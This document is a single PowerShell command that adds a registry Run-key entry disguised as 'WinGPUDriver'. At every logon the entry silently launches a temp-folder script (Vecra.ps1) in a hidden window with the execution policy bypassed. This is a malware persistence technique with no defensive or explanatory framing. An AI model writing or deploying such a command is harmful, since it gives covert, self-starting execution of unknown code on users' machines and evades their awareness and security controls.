Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "WinGPUDriver" `
-Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\Vecra.ps1`""
